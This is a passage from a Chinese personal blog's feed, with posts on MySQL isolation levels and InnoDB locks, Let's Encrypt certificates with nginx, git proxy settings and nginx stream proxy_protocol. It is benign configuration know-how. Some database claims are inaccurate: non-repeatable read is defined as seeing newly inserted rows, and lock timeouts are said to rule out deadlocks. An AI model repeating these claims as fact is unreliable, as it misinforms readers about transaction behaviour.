title="FAQ"></a>FAQ</h1><ol><li><p>脏读</p><p> 指一个事务读取了另一个事务尚未提交的数据。假设有两个事务 A 和 B，事务 A 读取了事务 B 修改但尚未提交的数据，然后事务 B 回滚了修改。这时事务 A 读取到的数据就是脏数据，因为它是基于一个未提交的修改</p></li><li><p>不可重复读</p><p> 指一个事务在两次查询之间，另一个事务更新了新的数据，导致第一个事务在第二次查询中发现了新插入的数据</p></li><li><p>幻读</p><p> 指一个事务在两次查询之间，另一个事务插入或者删除了新的数据，导致第一个事务在第二次查询中发现了新插入的数据</p></li><li><p>查看mysql事务隔离级别</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@transaction</span>_ISOLATION;</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.transaction_ISOLATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@tx</span>_ISOLATION;</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.tx_ISOLATION;</span><br></pre></td></tr></table></figure></li><li><p>修改mysql事务隔离级别</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 设置隔离级别为 READ UNCOMMITTED</span></span><br><span class="line"><span class="keyword">SET</span> SESSION tx_isolation <span class="operator">=</span> <span class="string">&#x27;READ-UNCOMMITTED&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置隔离级别为 READ COMMITTED</span></span><br><span class="line"><span class="keyword">SET</span> SESSION tx_isolation <span class="operator">=</span> <span class="string">&#x27;READ-COMMITTED&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置隔离级别为 REPEATABLE READ</span></span><br><span class="line"><span class="keyword">SET</span> SESSION tx_isolation <span class="operator">=</span> <span class="string">&#x27;REPEATABLE-READ&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置隔离级别为 SERIALIZABLE</span></span><br><span class="line"><span class="keyword">SET</span> SESSION tx_isolation <span class="operator">=</span> <span class="string">&#x27;SERIALIZABLE&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ACID&quot;&gt;&lt;a href=&quot;#ACID&quot; class=&quot;headerlink&quot; title=&quot;ACID&quot;&gt;&lt;/a&gt;ACID&lt;/h1&gt;&lt;h2 id=&quot;原子性-atomicity&quot;&gt;&lt;a href=&quot;#原子性-atomicity&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="架构" scheme="https://blog.jumhorn.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>数据库事务的锁</title>
    <link href="https://blog.jumhorn.com/mysql_transaction_lock/"/>
    <id>https://blog.jumhorn.com/mysql_transaction_lock/</id>
    <published>2024-02-18T22:24:41.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h1><blockquote><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-locking.html">https://dev.mysql.com/doc/refman/8.0/en/innodb-locking.html</a></p></blockquote><ol><li>事务的执行是基于socket连接的，当连接连接中断或者超时，事务会回滚</li><li>多个事务执行时，可以开启两个终端测试不同的锁</li></ol><h1 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h1><h2 id="共享锁-Shared-Locks"><a href="#共享锁-Shared-Locks" class="headerlink" title="共享锁 (Shared Locks)"></a>共享锁 (Shared Locks)</h2><pre><code>共享锁允许多个事务同时读取一个资源，但是不允许写入操作，直到所有的共享锁被释放</code></pre><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 以共享模式锁定表中的行</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> your_table <span class="keyword">WHERE</span> some_column <span class="operator">=</span> <span class="string">&#x27;value&#x27;</span> LOCK <span class="keyword">IN</span> SHARE MODE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在事务中可以进行其他的并发读取操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><h2 id="排他锁-Exclusive-Locks"><a href="#排他锁-Exclusive-Locks" class="headerlink" title="排他锁 (Exclusive Locks)"></a>排他锁 (Exclusive Locks)</h2><pre><code>排他锁限制对资源的访问，只允许一个事务独占资源。其他事务不能对同一资源进行读取或写入操作</code></pre><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 以排他模式锁定表中的行</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> your_table <span class="keyword">WHERE</span> some_column <span class="operator">=</span> <span class="string">&#x27;value&#x27;</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在事务中可以进行更新或删除等操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><h2 id="行级锁-Record-Locks"><a href="#行级锁-Record-Locks" class="headerlink" title="行级锁 (Record Locks)"></a>行级锁 (Record Locks)</h2><pre><code>innodb默认使用行级锁，行级锁只会锁定所需的行，而不是整个表。这样其他事务就可以并发地访问表中的其他行</code></pre><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在行级别锁定特定的行</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> your_table <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">123</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在事务中进行其他操作，只锁定了 id 为 123 的行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><h2 id="间隙锁-Gap-Locks"><a href="#间隙锁-Gap-Locks" class="headerlink" title="间隙锁(Gap Locks)"></a>间隙锁(Gap Locks)</h2><pre><code>锁定范围区间</code></pre><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在行级别锁定特定的行</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> your_table <span class="keyword">WHERE</span> id <span class="operator">&gt;=</span> <span class="number">3</span> <span class="keyword">and</span> id<span class="operator">&lt;=</span> <span class="number">5</span>  <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在事务中进行其他操作，只锁定了 id 为 [3,5] 的行，操作其他行不受影响</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><h2 id="表级锁-Table-level-Locks"><a href="#表级锁-Table-level-Locks" class="headerlink" title="表级锁 (Table-level Locks)"></a>表级锁 (Table-level Locks)</h2><pre><code>表级锁会锁定整个表，而不是单个行。这样会阻塞其他事务的读取或写入操作，导致性能问题</code></pre><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOCK TABLES your_table WRITE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在表级别执行写操作</span></span><br><span class="line"></span><br><span class="line">UNLOCK TABLES;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="AUTO-INC锁"><a href="#AUTO-INC锁" class="headerlink" title="AUTO-INC锁"></a>AUTO-INC锁</h2><pre><code>该锁是表级锁理解主键自增锁是如何设计的，以及事务回滚时主键不是连续的</code></pre><h2 id="意向锁"><a href="#意向锁" class="headerlink" title="意向锁"></a>意向锁</h2><pre><code>意向锁是由存储引擎提供的，不用用户控制的锁，Innodb允许行级锁与表级锁共存，需要解决如下问题1. 当事务A想要获取表级排它锁时，如何保证该表上每一行都没有排它锁和共享锁2. 当事务A想要获取表级共享锁时，如何保证该表上每一行都没有排它锁S: shared lockIS: intention shared lockX: exclusive lockIX: intention exclusive lock</code></pre><table><thead><tr><th></th><th>X</th><th>IX</th><th>S</th><th>IS</th></tr></thead><tbody><tr><td>X</td><td>Conflict</td><td>Conflict</td><td>Conflict</td><td>Conflict</td></tr><tr><td>IX</td><td>Conflict</td><td>Compatible</td><td>Conflict</td><td>Compatible</td></tr><tr><td>S</td><td>Conflict</td><td>Conflict</td><td>Compatible</td><td>Compatible</td></tr><tr><td>IS</td><td>Conflict</td><td>Compatible</td><td>Compatible</td><td>Compatible</td></tr></tbody></table><p>横竖的X,IX,S,IS都要理解成表锁，先用该类型的表锁，查询是否可以锁住表。<br>比如IX,IX两个表锁可以共存，方便他们向下继续进行不同行的行锁，<br>意向锁的本质就是让行锁和表锁共存，提供不同粒度的锁</p><h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><ol><li><p>终端1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">Query OK, 0 rows affected (0.02 sec)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">select * from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span>=3 <span class="keyword">for</span> update;</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  3 | yasuo    | 65c05a0c |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">rollback;</span></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure></li><li><p>终端2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">update <span class="built_in">users</span> <span class="built_in">set</span> mail=<span class="string">&quot;yasuo@gmail.com&quot;</span> <span class="built_in">where</span> <span class="built_in">id</span>=3;</span></span><br><span class="line">ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction</span><br></pre></td></tr></table></figure><p> 其中终端2的命令在终端1开启锁之后rollback之前执行，就可以看到命令执行失败。<br> 所有锁都可以如此测试查看锁的特性，实际执行过程如下图</p></li></ol><table><thead><tr><th>session A</th><th>session B</th></tr></thead><tbody><tr><td>start transaction; mysql&gt; select * from users where id&#x3D;3 for update;</td><td></td></tr><tr><td></td><td>update users set mail&#x3D;”<a href="mailto:&#121;&#x61;&#x73;&#x75;&#111;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#121;&#x61;&#x73;&#x75;&#111;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a>“ where id&#x3D;3;(blocked)</td></tr><tr><td>rollback;</td><td></td></tr></tbody></table><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><ol><li><p>mysql事务都设置了timeout</p><p> 死锁的必要条件(互斥条件&#x2F;请求与保持条件&#x2F;不剥夺条件&#x2F;循环等待条件)<br> timeout破环了请求与保持条件，故不会发生死锁</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;锁&quot;&gt;&lt;a href=&quot;#锁&quot; class=&quot;headerlink&quot; title=&quot;锁&quot;&gt;&lt;/a&gt;锁&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/innodb-locki</summary>
      
    
    
    
    
    <category term="架构" scheme="https://blog.jumhorn.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>如何让网站使用https</title>
    <link href="https://blog.jumhorn.com/letsencrypt/"/>
    <id>https://blog.jumhorn.com/letsencrypt/</id>
    <published>2024-02-15T00:00:00.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Let’s-encrypt"><a href="#Let’s-encrypt" class="headerlink" title="Let’s encrypt"></a>Let’s encrypt</h1><pre><code>获取ssl证书，让网站安全访问</code></pre><h2 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h2><ol><li><p>http验证</p><p> 给你一个随机内容的文件，你把这个文件放在一个特定的位置，用待绑定的域名+特定path可以访问到这个文件，可以认为域名是你的</p></li><li><p>DNS验证</p><p> 给你一个随机字符串，你把这个字符串添加为待绑定域名的txt值，只要能通过公网上的DNS服务器解析到这个字串，就认为域名是你的</p></li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install certbot</span><br></pre></td></tr></table></figure><h2 id="http验证"><a href="#http验证" class="headerlink" title="http验证"></a>http验证</h2><ol><li><p>验证</p><p> http验证比较简单,按照提示步骤即可</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo certbot --nginx</span><br></pre></td></tr></table></figure><ol start="2"><li>更新<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo certbot renew</span><br></pre></td></tr></table></figure></li></ol><h2 id="DNS验证"><a href="#DNS验证" class="headerlink" title="DNS验证"></a>DNS验证</h2><ol><li><p>验证<br> DNS验证多了一步，要到DNS服务上添加一条text记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certbot --text --agree-tos --email &lt;your@email.com&gt; -d &lt;your.domain.com&gt; --manual --preferred-challenges dns --expand --renew-by-default  --manual-public-ip-logging-ok certonly</span><br></pre></td></tr></table></figure></li><li><p>更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certbot --manual --preferred-challenges dns certonly</span><br></pre></td></tr></table></figure></li></ol><h2 id="服务器-nginx"><a href="#服务器-nginx" class="headerlink" title="服务器(nginx)"></a>服务器(nginx)</h2><pre><code>其中fullchain.pem,privkey.pem都是上述验证命令给出的位置</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen       8880 ssl;</span><br><span class="line">server_name  chat.jumhorn.com;</span><br><span class="line"></span><br><span class="line">ssl_certificate      /etc/letsencrypt/live/chat.jumhorn.com/fullchain.pem;</span><br><span class="line">ssl_certificate_key  /etc/letsencrypt/live/chat.jumhorn.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">ssl_session_cache    shared:SSL:1m;</span><br><span class="line">ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">proxy_pass  http://127.0.0.1:54000/;</span><br><span class="line">proxy_http_version 1.1;</span><br><span class="line">proxy_read_timeout 300;</span><br><span class="line">proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">proxy_set_header X-Forwarded-Proto $scheme;//http or https</span><br><span class="line">proxy_set_header Host $http_host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header X-Real-PORT $remote_port;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><ol><li><p>http验证简单，为什么要DNS验证</p><p> 如果vps服务器供应商屏蔽了http的80&#x2F;443端口，那么http就无法验证，所以可以使用DNS验证</p></li><li><p>既然80&#x2F;443端口被封，那么要ssl证书有什么用</p><p> http无论那个端口在域名没有备案时都会直接被封，因为服务器厂商能过截获http明文报文内容,<br> https经过加密厂商无法知道传输内容，所以加密的重要性就不言而喻了(tls&#x2F;ssl)</p></li><li><p>dns方式更新了证书后，依然过期</p><p> 由于没有重启nginx服务器，导致nginx保存的依然是旧的证书</p></li><li><p>关于通配符域名证书</p><p> 申请域名证书时指定域名为*.example.com，即可为该域名的所有二级域名申请证书<br> 但是该证书对于根域名example.com不适用，所以根域名也要单独申请证书</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Let’s-encrypt&quot;&gt;&lt;a href=&quot;#Let’s-encrypt&quot; class=&quot;headerlink&quot; title=&quot;Let’s encrypt&quot;&gt;&lt;/a&gt;Let’s encrypt&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;获取ssl证书，让网站安全访问
&lt;/</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>git命令的代理配置</title>
    <link href="https://blog.jumhorn.com/git_proxy/"/>
    <id>https://blog.jumhorn.com/git_proxy/</id>
    <published>2024-01-29T19:00:00.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="git命令的代理配置"><a href="#git命令的代理配置" class="headerlink" title="git命令的代理配置"></a>git命令的代理配置</h1><pre><code>git命令访问github资源用了两种不同的协议http和ssh，两种协议对应的配置方式不相同</code></pre><h2 id="http代理配置"><a href="#http代理配置" class="headerlink" title="http代理配置"></a>http代理配置</h2><pre><code>对于只读仓库，只下载来说，用http方式配置即可，一般代理都能实现</code></pre><h3 id="1-从系统方向解决"><a href="#1-从系统方向解决" class="headerlink" title="1. 从系统方向解决"></a>1. 从系统方向解决</h3><pre><code>设置系统的全局代理，然后执行git命令即可</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export all_proxy=&quot;http://ip:port&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or [use socks5]</span></span><br><span class="line">export all_proxy=&quot;socks5://ip:port&quot;</span><br></pre></td></tr></table></figure><h3 id="2-从git仓库配置方向解决"><a href="#2-从git仓库配置方向解决" class="headerlink" title="2. 从git仓库配置方向解决"></a>2. 从git仓库配置方向解决</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &quot;http://ip:port&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or [use socks5]</span></span><br><span class="line">git config --global http.proxy &quot;socks5://ip:port&quot;</span><br></pre></td></tr></table></figure><pre><code>上述两种方法配置好后，git pull要注意协议必须时http，上述配置才有用</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull https://github.com/xxx/xxx.git</span><br></pre></td></tr></table></figure><h2 id="ssh代理配置"><a href="#ssh代理配置" class="headerlink" title="ssh代理配置"></a>ssh代理配置</h2><h3 id="1-从系统方向解决-1"><a href="#1-从系统方向解决-1" class="headerlink" title="1. 从系统方向解决"></a>1. 从系统方向解决</h3><pre><code>设置系统的全局代理，然后执行git命令即可</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vim ~/.ssh/config <span class="comment"># edit this file</span></span></span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">for</span> bsd nc</span></span><br><span class="line">ProxyCommand nc -x 127.0.0.1:7890 %h %p</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or <span class="keyword">for</span> mac nc</span></span><br><span class="line">ProxyCommand /usr/bin/nc -X 5 -x 127.0.0.1:7890 %h %p</span><br></pre></td></tr></table></figure><h3 id="2-从git仓库配置方向解决-1"><a href="#2-从git仓库配置方向解决-1" class="headerlink" title="2. 从git仓库配置方向解决"></a>2. 从git仓库配置方向解决</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GIT_SSH_COMMAND=&#x27;ssh -o ProxyCommand=&quot;nc -x 127.0.0.1:7890 %h %p&quot;&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">OR [git global setting]</span></span><br><span class="line">git config --global core.sshCommand &#x27;ssh -o ProxyCommand=&quot;nc -x 127.0.0.1:7890 %h %p&quot;&#x27;</span><br></pre></td></tr></table></figure><pre><code>上述两种方法配置好后，clone,pull,push命令都可以正常使用</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull https://github.com/xxx/xxx.git</span><br></pre></td></tr></table></figure><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><ol><li><p>nc invalid option</p><p> nc版本各不相同，使用方法差距也有些大，使用前需要查一下,保持对应参数执行意思一致</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;git命令的代理配置&quot;&gt;&lt;a href=&quot;#git命令的代理配置&quot; class=&quot;headerlink&quot; title=&quot;git命令的代理配置&quot;&gt;&lt;/a&gt;git命令的代理配置&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;git命令访问github资源用了两种不同的协议http和s</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>nginx在stream模式下如何将客户端真实IP传递给服务端</title>
    <link href="https://blog.jumhorn.com/nginx-proxy-protocol/"/>
    <id>https://blog.jumhorn.com/nginx-proxy-protocol/</id>
    <published>2024-01-28T16:13:15.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nginx使用stream分流"><a href="#nginx使用stream分流" class="headerlink" title="nginx使用stream分流"></a>nginx使用stream分流</h1><pre><code>nginx用443端口同时支持ssh和http服务器访问，只能使用一个端口，这时候就要用到stream分流实际原理是nginx在tcp建立连接后会发送一条tcp信息包含客户端ip和port，所以后端服务要适配接收该tcp信息，主动接收该报文信息，当后端服务不需要该信息时，也要主动接收，否则nginx发送的报文给后端服务器，导致后端服务器接收到未知报文处理不当时会报错</code></pre><h2 id="nginx-stream配置"><a href="#nginx-stream配置" class="headerlink" title="nginx stream配置"></a>nginx stream配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># SNI 分流</span><br><span class="line">stream &#123;</span><br><span class="line">  map $ssl_preread_server_name $upstream &#123;</span><br><span class="line">    jumhorn.com   127.0.0.1:80; # for http</span><br><span class="line">    default          127.0.0.1:22; # for ssh</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">    listen      443;</span><br><span class="line">    proxy_pass  $upstream;</span><br><span class="line">    proxy_protocol on;# send ip info to http server</span><br><span class="line">    ssl_preread on;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># http server</span><br><span class="line">server &#123;</span><br><span class="line">    listen 127.0.0.1:80 ssl proxy_protocol;</span><br><span class="line">    server_name jumhorn.com;</span><br><span class="line"></span><br><span class="line">    proxy_set_header X-Real-IP $proxy_protocol_addr;</span><br><span class="line">    proxy_set_header X-Real-PORT $proxy_protocol_port;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http_server;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><pre><code>这时候http服务可以收到客户端的真实IP和PORT，但是ssh服务不需要该信息。接下来需要用巧妙的方法，中间设置一个代理，主动接收该信息，然后将其余信息继续发送给ssh服务器</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># SNI 分流</span><br><span class="line">stream &#123;</span><br><span class="line">  map $ssl_preread_server_name $upstream &#123;</span><br><span class="line">    jumhorn.com   127.0.0.1:80; # for http</span><br><span class="line">    default          127.0.0.1:222; # for ssh</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">    listen      443;</span><br><span class="line">    proxy_pass  $upstream;</span><br><span class="line">    proxy_protocol on;# send ip info to http server</span><br><span class="line">    ssl_preread on;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # server use to remove proxy protocol for ssh server</span><br><span class="line">  server &#123;</span><br><span class="line">    listen 127.0.0.1:222 proxy_protocol;</span><br><span class="line">    proxy_pass 127.0.0.1:22;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># http server</span><br><span class="line">server &#123;</span><br><span class="line">    listen 127.0.0.1:80 ssl proxy_protocol;</span><br><span class="line">    server_name jumhorn.com;</span><br><span class="line"></span><br><span class="line">    proxy_set_header X-Real-IP $proxy_protocol_addr;</span><br><span class="line">    proxy_set_header X-Real-PORT $proxy_protocol_port;</span><br><span class="line">    location / &#123;</span><br><span class="line">        